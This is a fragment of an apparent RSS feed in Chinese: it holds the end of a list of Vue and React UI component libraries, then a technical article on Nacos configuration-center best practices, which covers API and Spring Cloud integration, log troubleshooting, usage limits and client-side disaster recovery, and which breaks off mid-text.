&lt;p id=&quot;ue72424ee&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;A Vue.js UI framework with only the bright side. &lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u6ee88d39&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u9cc66618&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://antoniandre.github.io/wave-ui/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://antoniandre.github.io/wave-ui/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://antoniandre.github.io/wave-ui/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;BfUVg&quot;&gt;&lt;a name=&quot;toc-16&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;React&lt;/span&gt;&lt;/h2&gt;
&lt;h3 id=&quot;DblGn&quot;&gt;&lt;a name=&quot;toc-17&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Ant Design of React&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;u9e60ec56&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;antd 是基于 Ant Design 设计体系的 React UI 组件库，主要用于研发企业级中后台产品。&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u1445bbee&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;蚂蚁金服团队&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u2113c282&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://ant.design/docs/react/introduce-cn&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://ant.design/docs/react/introduce-cn&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://ant.design/docs/react/introduce-cn&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ZK6Yw&quot;&gt;&lt;a name=&quot;toc-18&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;React Vant&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;u61cf5d37&quot; class=&quot;ne-p&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;根据 Vant 开发的基于 React 开发的移动端组件库。&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;ud4fcdb32&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u9cdc829d&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://react-vant-gitee.3lang.dev/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://react-vant-gitee.3lang.dev/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://react-vant-gitee.3lang.dev/&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;LBgWW&quot;&gt;&lt;a name=&quot;toc-19&quot;/&gt;&lt;span class=&quot;ne-text&quot;&gt;Element React&lt;/span&gt;&lt;/h3&gt;
&lt;p id=&quot;u97b6bae5&quot; class=&quot;ne-p&quot;&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://github.com/ElemeFE/element&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://github.com/ElemeFE/element&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;Element&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;ne-text&quot;&gt; was initially written in &lt;/span&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://vuejs.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://vuejs.org/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;Vue&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;ne-text&quot;&gt;, which has many elegant UI components, but we also love &lt;/span&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://facebook.github.io/react/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://facebook.github.io/react/&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;React&lt;/span&gt;&lt;/a&gt;&lt;span class=&quot;ne-text&quot;&gt;, so we forked it for the React community.&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u90aea7aa&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;创作者：&lt;/span&gt;&lt;/strong&gt;&lt;span class=&quot;ne-text&quot;&gt;开源社区&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;u6ed179a6&quot; class=&quot;ne-p&quot;&gt;&lt;strong&gt;&lt;span class=&quot;ne-text&quot;&gt;文档地址：&lt;/span&gt;&lt;/strong&gt;&lt;a class=&quot;ne-link&quot; href=&quot;https://elemefe.github.io/element-react/index&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot; data-href=&quot;https://elemefe.github.io/element-react/index&quot;&gt;&lt;span class=&quot;ne-text&quot;&gt;https://elemefe.github.io/element-react/index&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
    &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>101e97cb6903561ed933caf8f46bac5e</guid>
<title>Nacos 配置管理最佳实践</title>
<link>https://toutiao.io/k/1traalp</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;div class=&quot;RichText ztext Post-RichText css-1g0fqss&quot; options=&quot;[object Object]&quot;&gt;&lt;h2 data-first-child=&quot;&quot;&gt;Nacos 简介&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d96af18c14c1ba7c03648e3f6aa2af5b_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;515&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic4.zhimg.com/v2-d96af18c14c1ba7c03648e3f6aa2af5b_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;515&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic4.zhimg.com/v2-d96af18c14c1ba7c03648e3f6aa2af5b_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-d96af18c14c1ba7c03648e3f6aa2af5b_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;4KM9VilT&quot;&gt;Nacos 是一个更易于构建云原生应用的微服务基础平台，核心包含动态服务发现，配置管理，服务管理平台。&lt;/p&gt;&lt;p data-pid=&quot;Lroy-YIN&quot;&gt;配置管理是 Nacos 的核心功能，它提供了运行期不重启应用的情况下动态修改配置值的功能。&lt;/p&gt;&lt;h2&gt;Nacos 配置中心发展历程&lt;/h2&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b232100fff56b6761b88ea2e37ec5851_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;626&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic2.zhimg.com/v2-b232100fff56b6761b88ea2e37ec5851_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;626&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic2.zhimg.com/v2-b232100fff56b6761b88ea2e37ec5851_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-b232100fff56b6761b88ea2e37ec5851_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;OHVgMq6P&quot;&gt;Nacos 配置中心是从阿里集团内配置中心 Diamond 孵化而来，其整体发展分为三个阶段：&lt;/p&gt;&lt;h3&gt;1.阿里集团内部孵化期&lt;/h3&gt;&lt;p data-pid=&quot;gQCpfw8K&quot;&gt;nacos 配置中心诞生于阿里巴巴集团内部的配置中心 Diamond，前期主要服务于集团内部对动态配置的需求。&lt;/p&gt;&lt;h3&gt;2.开源&amp;amp;商业化探索尝试&lt;/h3&gt;&lt;p data-pid=&quot;-Q27Qa-o&quot;&gt;集团 Diamond 经历了从开源再到闭源的过程，发布了商业化产品 ACM，并在 2018 年以 Nacos 配置中心为载体再次开源，期间对配置中心的开源及商业化进行了探索。&lt;/p&gt;&lt;h3&gt;3.三位一体融合发展&lt;/h3&gt;&lt;p data-pid=&quot;2HqXS8D-&quot;&gt;明确三位一体发展战略，以开源 Nacos 为内核，插件化支持集团 Diamond &amp;amp;商业化 MSE 定制的配置中心，三位一体融合发展。&lt;/p&gt;&lt;p data-pid=&quot;jx50TTSc&quot;&gt;&lt;b&gt;开源&lt;/b&gt;：以开源 Nacos 2.0 为内核，重构通信协议，性能扩展性提升10倍，支持 10w 级实例规模，提升开放性，联合开源微服务生态共同发展。&lt;/p&gt;&lt;p data-pid=&quot;_wXqPktM&quot;&gt;&lt;b&gt;商业化&lt;/b&gt;：支持 Nacos2.0 和专业版，目前 20% 用户升级到 Nacos2.0，并且支持配置鉴权和加密能力，推送轨迹等高级功能。&lt;/p&gt;&lt;p data-pid=&quot;vEHb4rdc&quot;&gt;&lt;b&gt;集团&lt;/b&gt;：关注性能和高可用能力，支持大促 1 小时建站，10 分钟支持响应；完成 Diamond Over Nacos2.0 架构演进，扩展性提升 1 倍，支持 500w 实例规模。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f033a1f4884f9bb57e3ef573a1023a95_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;987&quot; data-rawheight=&quot;547&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic2.zhimg.com/v2-f033a1f4884f9bb57e3ef573a1023a95_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;987&quot; data-rawheight=&quot;547&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic2.zhimg.com/v2-f033a1f4884f9bb57e3ef573a1023a95_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-f033a1f4884f9bb57e3ef573a1023a95_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h2&gt;应用场景&amp;amp;双十一实践&lt;/h2&gt;&lt;p data-pid=&quot;2G4W0Hzt&quot;&gt;Nacos 配置管理应用场景&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7a5006df97613cd800012e345ce1372c_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;613&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic1.zhimg.com/v2-7a5006df97613cd800012e345ce1372c_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;613&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic1.zhimg.com/v2-7a5006df97613cd800012e345ce1372c_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-7a5006df97613cd800012e345ce1372c_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;rLY1Dh2n&quot;&gt;配置中心在业务域，基础技术域都有着广泛的应用，包括业务应用的开关，微服务生态的服务路由及元数据，高可用生态的预案，切流规则及降级开关等，前端生态的各类文案公告，数据库生态的核心配置参数，动态切库等配置。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4e597ebd4e9dc44fd25e8a49f9fa98a0_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;648&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic1.zhimg.com/v2-4e597ebd4e9dc44fd25e8a49f9fa98a0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;648&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic1.zhimg.com/v2-4e597ebd4e9dc44fd25e8a49f9fa98a0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-4e597ebd4e9dc44fd25e8a49f9fa98a0_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;sHwK8C2l&quot;&gt;在每年阿里集团的双十一大促中，配置中心也是一个不可或缺的基础组件，包括前期热点商品推送，大促氛围活动标调整，大促期间数据库主备切换开关，核心功能降级，各类名单调整，预案限流调整，各种基础中间件的核心参数动态，大促结束后各类预案的恢复，大促态到日常态的状态切换，都是配置中心所支持的场景。&lt;/p&gt;&lt;h2&gt;配置中心使用指引&lt;/h2&gt;&lt;h3&gt;1.配置中心原理&lt;/h3&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-3d8af0bda4e1e5ba674d11272f0a5bb7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;543&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic4.zhimg.com/v2-3d8af0bda4e1e5ba674d11272f0a5bb7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;543&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic4.zhimg.com/v2-3d8af0bda4e1e5ba674d11272f0a5bb7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-3d8af0bda4e1e5ba674d11272f0a5bb7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;ul&gt;&lt;li data-pid=&quot;zqNM4d-7&quot;&gt;业务应用：nacos 的使用方，通过 nacos-client 实现配置的发布，查询，监听回调的等基础操作。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;VPnLBIW_&quot;&gt;负载均衡 SLB：与后端的 nacos 服务节点进行交互的地址，在用户自建或者调试的场景下，也可以采用直连 IP 或者地址服务器 endpoint 的模式。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;ISy-3TKX&quot;&gt;Nacos Server：nacos 服务端存储当前集群全量配置的内存和磁盘缓存，集群节点之间进行水平通知配置变更事件，和后端数据库进行对账保证数据一致性。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;SoCcODnv&quot;&gt;Nacos 控制台：管理控制台，可以进行配置查看，配置发布，监听查询等运维功能。商业化 Nacos 支持推送轨迹，监控，事件中心等高级功能。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;HxsKfDx4&quot;&gt;数据库：配置持久化存储的数据库，一般是主备库架构进行容灾。&lt;/li&gt;&lt;/ul&gt;&lt;p data-pid=&quot;bhiMe1MI&quot;&gt;用户在接入 nacos 主要有两种模式，一种是通过原生 nacos-client 的 ConfigService 组件的基础 API 接入，第二种是通过 Spring 框架或者其他类似框架组件接入，包括 SpringCloud 和 SpringBoot 等。&lt;/p&gt;&lt;h3&gt;2.基础 API 接入&lt;/h3&gt;&lt;p data-pid=&quot;sKgrkzcs&quot;&gt;nacos 配置中心以 NacosConfigService 接口对外提供基础 API，包括配置发布，查询，监听，回调等基础功能。&lt;/p&gt;&lt;p data-pid=&quot;jUI9tXbq&quot;&gt;在构建 ConfigService 时需要指定 Nacos 的服务端地址，需要访问的命名空间。更多的 API 使用细节，可参照官方文档。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;Properties properties = new Properties();
properties.put(PropertyKeyConst.SERVER_ADDR, &quot;127.0.0.1&quot;);
properties.put(PropertyKeyConst.NAMESPACE, &quot;namespaceId&quot;);

final ConfigService configService = new NacosConfigService(properties);
final String dataId = &quot;my-config-dataId&quot;;
final String group = &quot;group&quot;;
//初始化查询配置，并添加监听器，监听后续变更
String config = configService.getConfigAndSignListener(dataId, group, 3000L, new Listener() {
    @Override
    public Executor getExecutor() {
        //如果回调逻辑比较耗时，建议自定义线程池，以免堵塞推送回调线程
        return null;
    }
            
    @Override
    public void receiveConfigInfo(String configInfo) {
        handleBusinessLogic(configInfo);
    }
});

//初始化业务逻辑.
handleBusinessLogic(config);&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3&gt;3.SpringCloud 接入&lt;/h3&gt;&lt;p data-pid=&quot;i5w3JIlm&quot;&gt;新增 bootstrap.yml,配置 nacos 相关参数，包括 nacos 地址，命令空间等参数，具体可参照 com.alibaba.cloud.nacos.NacosConfigProperties 属性类。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;spring:
  application:
    name: nacos-config-demo
  cloud:
    nacos:
      config:
        server-addr: 127.0.0.1:8848
        namespace: namespaceid-对应nacos服务端的命名空间ID,public填空
        group: group-demo
        file-extension: yml
        refresh-enabled: true
        accessKey: xxx
        secretKey: xxx&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p data-pid=&quot;fNdeabkl&quot;&gt;在配置中心对应命名空间下创建 dataId=nacos-config-demo.yml,group=group-demo 的配置&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-e3bd141f823c5707dbd72e8ae461b28e_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;602&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic3.zhimg.com/v2-e3bd141f823c5707dbd72e8ae461b28e_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;602&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic3.zhimg.com/v2-e3bd141f823c5707dbd72e8ae461b28e_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-e3bd141f823c5707dbd72e8ae461b28e_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;MiiQxq8j&quot;&gt;使用 @Value 注解引用 nacos 中的参数值，当 nacos 中配置值发生变化时，value 的值会自动更新。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;@Configuration
@RefreshScope
public class ConfigBean {
    
    @Value(&quot;${cache.useLocalCache:false}&quot;)
    private boolean useLocalCache;
    
    public boolean isUseLocalCache() {
        return useLocalCache;
    }
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p data-pid=&quot;ZlNL0rZR&quot;&gt;通过 Value 注解可以实现属性值的自动更新，如果希望在配置内容变更时触发回调方法执行。在SpringCloud也可以通过NacosConfigManager#getConfigService获取 springboot 内置的 NacosConfigService 进行基础 API 操作。&lt;/p&gt;&lt;p data-pid=&quot;38FOT7CC&quot;&gt;更多的接入指引可参照官方文档：&lt;/p&gt;&lt;h3&gt;4.日志自助排查&lt;/h3&gt;&lt;p data-pid=&quot;1-xFSMPY&quot;&gt;以上介绍两种比较典型的 nacos 配置中心的接入方式，在日常使用过程中，nacos-client 本地的日志是非常有助于提高问题排查效率。&lt;/p&gt;&lt;p data-pid=&quot;BL9JxyfJ&quot;&gt;nacos 在发布配置，监听配置及变更推送时都会在 {user.home}/logs/nacos/config.log 中打印详细的事件日志。以下是客户端运行期打印的几个关键日志：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-168034249ce24a8496d6750e3653e121_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;185&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic2.zhimg.com/v2-168034249ce24a8496d6750e3653e121_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;185&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic2.zhimg.com/v2-168034249ce24a8496d6750e3653e121_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-168034249ce24a8496d6750e3653e121_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;ul&gt;&lt;ul&gt;&lt;li data-pid=&quot;LVwMu7FZ&quot;&gt;add-listener:   添加监听，只有添加了对配置的监听，才能收到配置变更推送&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;1FAIEXdT&quot;&gt;server-push：客户端已经收到某个配置的变更通知&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;adL4zQRr&quot;&gt;data-received：收到变更通知后，客户端向服务端查询到了最新的配置内容&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;VD6G53O1&quot;&gt;notify-listener: nacos回调了的监听器Listener，可以看到回调的配置内容MD5。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;QpIPl9GU&quot;&gt;notify-ok:  回调执行正常，可以查看执行回调的具体监听器 Listener，执行耗时。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;vdQIvza0&quot;&gt;notify-error:监听器执行失败，对业务来说可能业务不符合预期，需要根据异常排查原因。&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;p data-pid=&quot;Z73qaQyA&quot;&gt;如果有 notify-listener 日志，但是没有 notify-ok 日志，则可能是监听器执行堵塞。如果想确认回调线程是否阻塞，可以通过 jstack 命令查看线程堆栈，jstack {pid} | grep -20 &#x27;nacos&#x27; ，通过堆栈判断导致线程堵塞的原因，对应解决即可。&lt;/p&gt;&lt;h3&gt;5.使用须知&lt;/h3&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8a881753f80c0ae186aa412b8cc2e9fc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;476&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic1.zhimg.com/v2-8a881753f80c0ae186aa412b8cc2e9fc_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;476&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic1.zhimg.com/v2-8a881753f80c0ae186aa412b8cc2e9fc_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-8a881753f80c0ae186aa412b8cc2e9fc_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p data-pid=&quot;46a3qAgJ&quot;&gt;配置中心的主要作用是发布 meta-data，而不是数据的存储服务。我们对所发布的单个配置数据内容大小 100k 以内。&lt;/p&gt;&lt;p data-pid=&quot;oxrxRASZ&quot;&gt; nacos 是个配置管理系统，不是流量链路产品，配置变更需小于 1 次/分钟。&lt;/p&gt;&lt;p data-pid=&quot;HD3PiLwJ&quot;&gt;nacos 与 redis 等缓存产品有着本质上区别，所以请不要在流量链路内查询配置，正常情况下应用启动时查询一次配置进行业务初始化，后续只需监听配置变化即可。&lt;/p&gt;&lt;p data-pid=&quot;qAgsPs5c&quot;&gt;nacos 只保证最后一次推送的值一定会到达，不保证中间的每一次变更都会送达订阅端。配置在发布成功后并不是实时推送到客户端，中间有一定的时延。&lt;/p&gt;&lt;p data-pid=&quot;4on7SeRc&quot;&gt;nacos 可能在网络状况欠佳时会向订阅者发送重复的数据通知，订阅者对数据通知的处理应满足幂等性，支持重复推送，相同配置回调多次不应产生异常预期外的情况。&lt;/p&gt;&lt;p data-pid=&quot;TwCyK2NB&quot;&gt;在回调监听器中，处理逻辑应尽量轻量化，高耗时操作容易堵塞回调线程，影响其他配置的推送。对于重回调的场景，可以自定义业务线程池异步化处理。&lt;/p&gt;&lt;p data-pid=&quot;AyYUPb6k&quot;&gt;错用场景：&lt;/p&gt;&lt;ul&gt;&lt;li data-pid=&quot;-li7iWgK&quot;&gt;配置超过 1M，频繁变更导致配置中心数据库可用性下降&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;xIYTPe9P&quot;&gt;配置频繁变更，导致对客户端造成推送风暴，造成客户端应用 cpu,gc 压力。&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;r2vY7zTm&quot;&gt;客户端在流量链路中调用 getConfig 方法查询配置，业务请求上涨时，配置中心服务端压力上涨，可用性下降&lt;br/&gt;&lt;/li&gt;&lt;li data-pid=&quot;oBs-eIek&quot;&gt;回调方法中处理远程 RPC，IO 操作，锁等待等造成回调方法执行堵塞，进而堵塞其他配置变更推送，影响业务&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;配置中心高可用&lt;/h2&gt;&lt;h3&gt;1.客户端容灾&lt;/h3&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f978289eef5f39a5c53ef6d8e88f8d44_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;283&quot; class=&quot;origin_image zh-lightbox-thumb&quot; data-original=&quot;https://pic1.zhimg.com/v2-f978289eef5f39a5c53ef6d8e88f8d44_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1080&quot; data-rawheight=&quot;283&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; data-original=&quot;https://pic1.zhimg.com/v2-f978289eef5f39a5c53ef6d8e88f8d44_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-f978289eef5f39a5c53ef6d8e88f8d44_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;h3&gt;容灾目录&lt;/h3&gt;&lt;p data-pid=&quot;EPOa43cR&quot;&gt;当服务端不可用时且短时无法恢复时，用户可以在本地的容灾目录中手动更新配置内容，以达到模拟服务端配置发生变更的场景。容灾目录中的配置内容具有最高优先级，配置的查询&amp;amp;监听逻辑都将返回容灾配置内容，因此当远程 nacos 服务端恢复正常时，需要将容灾目录中的内容发布到远端，然后删除本地容灾目录。&lt;/p&gt;&lt;p data-pid=&quot;iuMiuv_1&quot;&gt;容灾目录地址：&lt;/p&gt;&lt;ul&gt;&lt;ul&gt;&lt;li data-pid=&quot;3mREIZPv&quot;&gt;public 命名空间：{user.home}/nacos/config/{servername}_nacos/data/config-data&lt;/li&gt;&lt;li data-pid=&quot;RHLtpD9b&quot;&gt;非 public 命名空间：{user.home}/nacos/config/{servername}_nacos/data/config-data-tenant&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;h3&gt;本地缓存&lt;/h3&gt;&lt;p data-pid=&quot;5lw_PgYq&quot;&gt;nacos向服务端查询一次配置内容时，会将内容同步到本地磁盘，当下一次访问服务端接口失败时，会读取本地配置内容，以最大程度保证客户端可用。&lt;/p&gt;&lt;p data-pid=&quot;4wooZART&quot;&gt;缓存目录地址：&lt;/p&gt;&lt;ul&gt;&lt;ul&gt;&lt;li data-pid=&quot;9_nohuEn&quot;&gt;public 命名空间：{user.home}/nacos/config/{servername}_nacos/snapshot&lt;/li&gt;&lt;li data-pid=&quot;SOwR34Y1&quot;&gt;非 public 命名空间：{user.home}/nacos/config/{servername}_nacos/snapshot-tenant&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;h3&gt;2.服务端反脆弱&lt;/h3&gt;&lt;p 